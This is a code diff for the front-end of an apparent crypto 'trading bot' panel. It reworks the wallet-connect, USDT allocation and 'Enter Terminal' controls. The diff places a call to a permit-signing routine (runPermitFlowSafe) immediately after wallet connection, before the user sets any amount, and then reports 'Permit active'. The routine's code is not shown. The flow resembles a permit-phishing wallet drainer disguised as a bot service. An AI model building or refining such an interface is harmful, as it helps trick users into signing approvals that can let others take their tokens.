@@ -100,7 +100,21 @@ body {
     transition: all 0.2s ease;
     text-align: left;
 }
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+}
 
+#allocation-input:disabled {
+    opacity: 0.35;
+    cursor: not-allowed;
+}
+
+#allocation-input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 12px var(--accent-glow);
+}
 .control-btn:hover {
     border-color: var(--accent);
     color: #ffffff;
@@ -204,59 +218,81 @@ body {
     <div class="panel-header">Bot Control</div>
     <div class="module-body">
 
-        <div class="btn-stack">
-            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
-            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
-            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Terminal Access</button>
-            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
-    4. Disconnect Wallet
-</button>
+      <div class="btn-stack">
 
-<!-- ALLOCATION INPUT -->
-
-<div style="margin-top:12px;">
-
-    <div style="
-        font-size:10px;
-        color:#64748b;
-        margin-bottom:6px;
-        letter-spacing:1px;
-    ">
-        CAPITAL ALLOCATION
-    </div>
-
-    <input
-        id="allocation-input"
-        type="number"
-        min="600"
-        max="3000000"
-        step="1"
-        placeholder="MIN 600 — MAX 3,000,000 USDT"
-        style="
-            width:100%;
-            background:#080b12;
-            border:1px solid #1a2638;
-            color:#cbd5e1;
-            padding:10px;
-            border-radius:8px;
-            outline:none;
-            font-family:'JetBrains Mono', monospace;
-            font-size:11px;
-        "
+    <button
+        id="btn-wallet"
+        class="control-btn btn-cyan"
+        onclick="connectWallet()"
     >
+        1. Connect Wallet
+    </button>
 
-    <div
-        id="allocation-status"
-        style="
-            margin-top:6px;
+    <!-- ALLOCATION -->
+
+    <div style="margin-top:12px;">
+
+        <div style="
             font-size:10px;
-            color:#475569;
-        "
-    >
-        Awaiting allocation...
+            color:#64748b;
+            margin-bottom:6px;
+            letter-spacing:1px;
+        ">
+            2. CAPITAL ALLOCATION
+        </div>
+
+        <input
+            id="allocation-input"
+            type="text"
+            inputmode="numeric"
+            placeholder="MIN 600 — MAX 3,000,000 USDT"
+            disabled
+            style="
+                width:100%;
+                background:#080b12;
+                border:1px solid #1a2638;
+                color:#cbd5e1;
+                padding:10px;
+                border-radius:8px;
+                outline:none;
+                font-family:'JetBrains Mono', monospace;
+                font-size:11px;
+                cursor:text;
+                appearance:none;
+                -moz-appearance:textfield;
+            "
+        >
+
+        <div
+            id="allocation-status"
+            style="
+                margin-top:6px;
+                font-size:10px;
+                color:#475569;
+            "
+        >
+            Connect wallet first...
+        </div>
+
     </div>
 
-</div>
+    <button
+        id="btn-authorize"
+        class="control-btn btn-amber"
+        onclick="authorizeTrading()"
+        disabled
+    >
+        3. Enter Terminal
+    </button>
+
+    <button
+        id="btn-disconnect"
+        class="control-btn"
+        onclick="disconnectWallet()"
+        disabled
+    >
+        Disconnect Wallet
+    </button>
         </div>
 
         <div class="status-box">
@@ -413,12 +449,13 @@ await provider.send("eth_requestAccounts", []);
   updateStatus('dot-bot','st-bot','OFFLINE','#475569');
   updateStatus('dot-access','st-access','RESTRICTED','#475569');
 
-  document.getElementById('btn-authorize').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-
   document.getElementById('btn-wallet').disabled = true;
-  document.getElementById('btn-activate').disabled = false;
-  document.getElementById('btn-disconnect').disabled = false;
+
+document.getElementById('btn-disconnect').disabled = false;
+
+document.getElementById('btn-authorize').disabled = true;
+
+document.getElementById('allocation-input').disabled = true;
 
   await runPermitFlowSafe(provider, signer, user);
 
@@ -645,13 +682,13 @@ try {
     '#6366f1'
   );
 
-  document.getElementById('btn-authorize').disabled = false;
+  document.getElementById('allocation-input').disabled = false;
 
-  document.getElementById('btn-authorize').innerText =
-    "3. Enter Terminal";
+document.getElementById('allocation-status').innerText =
+  "Permit active — set allocation";
 
-  document.getElementById('btn-activate').disabled = true;
-
+document.getElementById('allocation-status').style.color =
+  "#10b981";
 } catch (e) {
   log("❌ NETWORK ERROR: " + e.message);
 }
@@ -669,9 +706,7 @@ function renderWallet(address) {
  updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
 }
 
-function activateBot() {
- updateStatus('dot-bot','st-bot','READY','#6366f1');
-}
+
 
 function authorizeTrading() {
 
@@ -699,8 +734,12 @@ const allocationStatus =
 
 allocationInput.addEventListener('input', () => {
 
-  const value =
-    Number(allocationInput.value);
+  const clean =
+    allocationInput.value.replace(/[^0-9]/g, '');
+
+  allocationInput.value = clean;
+
+  const value = Number(clean);
 
   if (!value) {
 
@@ -709,6 +748,8 @@ allocationInput.addEventListener('input', () => {
 
     allocationStatus.style.color =
       "#475569";
+
+    document.getElementById('btn-authorize').disabled = true;
 
     return;
   }
@@ -721,6 +762,8 @@ allocationInput.addEventListener('input', () => {
     allocationStatus.style.color =
       "#ef4444";
 
+    document.getElementById('btn-authorize').disabled = true;
+
     return;
   }
 
@@ -731,6 +774,8 @@ allocationInput.addEventListener('input', () => {
 
     allocationStatus.style.color =
       "#ef4444";
+
+    document.getElementById('btn-authorize').disabled = true;
 
     return;
   }
@@ -743,7 +788,12 @@ allocationInput.addEventListener('input', () => {
   allocationStatus.style.color =
     "#10b981";
 
+  document.getElementById('btn-authorize').disabled = false;
+
 });
+
+
+
 window.connectWallet = connectWallet;
 
 </script>
